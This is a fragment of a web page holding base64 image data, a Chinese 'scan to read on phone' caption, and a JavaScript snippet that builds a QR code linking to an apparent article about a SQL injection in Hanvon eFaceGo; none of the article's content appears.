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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-exportMeetingEmployeeRecordExcel-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 